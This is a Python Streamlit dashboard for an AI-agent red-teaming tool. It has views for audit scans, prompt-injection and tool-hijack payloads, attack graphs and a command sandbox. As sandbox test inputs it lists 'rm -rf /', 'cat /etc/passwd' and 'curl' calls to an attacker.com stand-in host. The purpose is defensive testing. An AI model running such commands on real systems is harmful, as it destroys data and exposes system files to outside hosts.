"""
ASTRAXIS-AI Interactive Cyber Security Streamlit Web Application.

Provides a live visual dashboard for red-teaming AI agent systems,
visualizing attack graphs, launching container sandbox runs, and inspecting SHA-256 reports.
"""
from __future__ import annotations

import os
import sys
import json
import streamlit as st

# Ensure src path is importable
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from astraxis.ui.theme import inject_glass_theme
from astraxis.orchestrator import OrchestratorEngine
from astraxis.redteam import PayloadGenerator, ToolHijacker, AgentCollusionSimulator
from astraxis.graph import AttackGraphBuilder, AttackGraphAnalyzer
from astraxis.sandbox import SandboxManager, SandboxBackend

# Page Configuration
st.set_page_config(
    page_title="ASTRAXIS-AI Cyber Dashboard",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

inject_glass_theme()

# Header Banner
st.markdown('<div class="cyber-title">🛡️ ASTRAXIS-AI</div>', unsafe_allow_html=True)
st.markdown(
    '<p style="color: #8A99AD; font-size: 1.1rem; font-weight: 500;">'
    'Autonomous Multi-Agent AI Red-Teaming, Exploit Simulation & Sandbox Infrastructure'
    '</p>',
    unsafe_allow_html=True
)

st.markdown("---")

# Sidebar Navigation & Settings
st.sidebar.markdown("### ⚙️ Engine Settings")
sandbox_choice = st.sidebar.radio(
    "Sandbox Isolation Backend:",
    ["Synthetic (Fast / Safe)", "Docker Container (Isolated)"],
    index=0
)
backend_enum = (
    SandboxBackend.DOCKER if "Docker" in sandbox_choice else SandboxBackend.SYNTHETIC
)

st.sidebar.markdown("---")
st.sidebar.markdown("### 📊 Module Navigation")
nav_selection = st.sidebar.selectbox(
    "Select Interface View:",
    [
        "🚀 Automated Red-Team Audit Scan",
        "🎯 Adversarial Payload Suite",
        "🕸️ NetworkX Attack Graph Analyzer",
        "🐳 Container Sandbox Isolation Engine",
        "📄 Tamper-Proof Audit Report Exporter"
    ]
)

# Shared Session State Engine Instance
if "orchestrator" not in st.session_state:
    st.session_state.orchestrator = OrchestratorEngine(force_sandbox_backend=backend_enum)
if "last_scan_result" not in st.session_state:
    st.session_state.last_scan_result = None

# View 1: Automated Red-Team Audit Scan
if nav_selection == "🚀 Automated Red-Team Audit Scan":
    st.markdown('<div class="glass-card">', unsafe_allow_html=True)
    st.subheader("🚀 Live Multi-Agent Red-Team Audit Pipeline")
    st.write(
        "Run an automated end-to-end audit scan across all synthetic agent nodes. "
        "Evaluates prompt injection, tool hijacking, graph path traversal, and container sandbox isolation."
    )

    col1, col2 = st.columns([1, 3])
    with col1:
        if st.button("🔥 Launch Full Red-Team Scan", type="primary", use_container_width=True):
            with st.spinner("Executing multi-agent exploit simulations..."):
                engine = OrchestratorEngine(force_sandbox_backend=backend_enum)
                res = engine.run_full_audit()
                st.session_state.last_scan_result = res
                st.success("✅ Audit Scan Completed Successfully!")

    st.markdown('</div>', unsafe_allow_html=True)

    if st.session_state.last_scan_result:
        res = st.session_state.last_scan_result
        m1, m2, m3, m4, m5 = st.columns(5)
        with m1:
            st.markdown(f'<div class="metric-box"><div class="metric-val">{res.risk_score}</div><div class="metric-lbl">Risk Score</div></div>', unsafe_allow_html=True)
        with m2:
            st.markdown(f'<div class="metric-box"><div class="metric-val">{res.total_payloads}</div><div class="metric-lbl">Total Payloads</div></div>', unsafe_allow_html=True)
        with m3:
            st.markdown(f'<div class="metric-box"><div class="metric-val">{res.hijack_count}</div><div class="metric-lbl">Tool Hijacks</div></div>', unsafe_allow_html=True)
        with m4:
            st.markdown(f'<div class="metric-box"><div class="metric-val">{res.exploit_paths}</div><div class="metric-lbl">Exploit Paths</div></div>', unsafe_allow_html=True)
        with m5:
            st.markdown(f'<div class="metric-box"><div class="metric-val">{res.violations}</div><div class="metric-lbl">Policy Violations</div></div>', unsafe_allow_html=True)

        st.markdown("<br>", unsafe_allow_html=True)
        st.markdown("### 🔒 Cryptographic Fingerprint Verification")
        st.code(f"SHA-256 Fingerprint: {res.sha256_hash}", language="text")

# View 2: Adversarial Payload Suite
elif nav_selection == "🎯 Adversarial Payload Suite":
    st.subheader("🎯 Adversarial Prompt Injection & Tool Hijack Generator")
    payload_gen = PayloadGenerator()
    payloads = payload_gen.generate_all()

    st.markdown(f"**Loaded Payload Suite Size:** `{len(payloads)} Active Scenarios`")

    for p in payloads:
        badge_class = "badge-critical" if p.severity == "critical" else ("badge-high" if p.severity == "high" else "badge-success")
        with st.expander(f"🔴 [{p.severity.upper()}] {p.category.value.upper()} - Payload #{p.payload_id[:8]}"):
            st.markdown(f"**Severity:** <span class='{badge_class}'>{p.severity.upper()}</span>", unsafe_allow_html=True)
            st.markdown(f"**Description:** {p.description}")
            st.code(p.content, language="text")

# View 3: NetworkX Attack Graph Analyzer
elif nav_selection == "🕸️ NetworkX Attack Graph Analyzer":
    st.subheader("🕸️ Multi-Hop Exploit Path Analysis")
    builder = AttackGraphBuilder()
    builder.build_default_architecture()
    analyzer = AttackGraphAnalyzer(builder)

    paths = analyzer.find_exploit_paths()
    summary = analyzer.summary()

    c1, c2, c3 = st.columns(3)
    c1.metric("Architecture Nodes", summary["total_nodes"])
    c2.metric("Directed Edges", summary["total_edges"])
    c3.metric("Exploit Paths Discovered", summary["total_exploit_paths"])

    st.markdown("### 📍 Top Discovered Exploit Paths")
    for p in paths:
        st.info(f"**[{p.path_score} Risk Score]** {p.description}")

# View 4: Container Sandbox Isolation Engine
elif nav_selection == "🐳 Container Sandbox Isolation Engine":
    st.markdown('<div class="glass-card">', unsafe_allow_html=True)
    st.subheader("🐳 Interactive Container Sandbox Executor")
    st.write(
        "Test how the sandbox isolates and intercepts untrusted agent tool calls. "
        "Enter any test command below or click a sample command to see sandbox protection in real time."
    )

    st.markdown("💡 **Sample Test Commands to Try:**")
    st.markdown(
        "• `<span class='sample-cmd'>python -c 'print(1+1)'</span>` (Safe Python calculation)<br>"
        "• `<span class='sample-cmd'>cat /etc/passwd</span>` (Path traversal exploit attempt)<br>"
        "• `<span class='sample-cmd'>rm -rf /</span>` (Destructive command deletion attempt)<br>"
        "• `<span class='sample-cmd'>curl http://attacker.com</span>` (Network exfiltration attempt)",
        unsafe_allow_html=True
    )
    st.markdown("</div>", unsafe_allow_html=True)

    manager = SandboxManager(force_backend=backend_enum)

    # Preset sample selection helper
    preset = st.selectbox(
        "Select a Quick Sample Command (or type a custom command below):",
        [
            "Custom Input",
            "python -c 'print(\"ASTRAXIS-AI Sandbox Active!\")'",
            "cat /etc/passwd",
            "rm -rf /",
            "curl http://attacker.com/cmd"
        ]
    )

    default_cmd = "python -c 'print(1+1)'" if preset == "Custom Input" else preset

    cmd_input = st.text_input("Enter command to execute in sandbox:", value=default_cmd)

    if st.button("🚀 Run Command in Sandbox", type="primary"):
        with st.spinner("Executing inside container boundary..."):
            result = manager.execute_payload(cmd_input)
            st.markdown("### 📊 Execution Result & Telemetry")
            if result.is_success:
                st.success(f"✅ Success (Exit Code 0) - Backend: {result.backend.value.upper()}")
            else:
                st.error(f"🔴 Blocked / Error (Exit Code {result.exit_code}) - Backend: {result.backend.value.upper()}")
            
            st.json(result.to_dict())

# View 5: Tamper-Proof Audit Report Exporter
elif nav_selection == "📄 Tamper-Proof Audit Report Exporter":
    st.subheader("📄 SHA-256 Tamper-Proof Report Exporter")
    if st.session_state.last_scan_result:
        res = st.session_state.last_scan_result
        json_bytes = json.dumps(res.to_dict(), indent=2).encode("utf-8")
        st.download_button(
            label="💾 Download Audit Report JSON",
            data=json_bytes,
            file_name=f"ASTRAXIS_AUDIT_REPORT_{res.scan_id[:8]}.json",
            mime="application/json"
        )
    else:
        st.warning("⚠️ No audit scan has been run yet. Launch a scan from the Automated Red-Team Audit view first.")

st.markdown("---")
st.markdown('<p style="text-align:center; color:#8A99AD; font-size:0.85rem;">ASTRAXIS-AI Security Sandbox Infrastructure • 100% Mock Environment • Zero Privileged Key Reading</p>', unsafe_allow_html=True)
